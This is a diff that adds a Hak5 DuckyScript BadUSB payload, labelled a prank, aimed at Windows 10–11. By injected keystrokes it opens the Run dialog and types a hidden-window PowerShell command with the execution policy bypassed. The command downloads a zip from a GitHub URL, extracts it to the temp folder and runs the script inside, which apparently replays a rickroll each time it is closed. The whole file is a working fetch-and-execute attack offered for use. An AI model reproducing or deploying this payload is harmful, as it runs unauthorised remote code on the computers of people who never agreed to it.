@@ -1,0 +1,12 @@
+REM Title: Advanced Rick"ware"
+REM Author: FalsePhilosopher
+REM Target:10-11
+REM Props: Hak5, big ups to Jakoby for the ADV rickroll work I built upon https://github.com/I-Am-Jakoby, the community and memes
+REM Version: 1.0
+REM Category: Prank
+REM Launches Jakoby's run prompt one liner rickroll and reopens the video every time it is closed.
+REM
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $U='https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Misc/rr.zip';$Z="$env:TMP"+'\rr.zip';$D="$env:TMP"+'\rr';iwr -Uri $U -O $Z;Expand-Archive $Z -DestinationPath $D\ -Force;powershell $D\rr.ps1
+ENTER
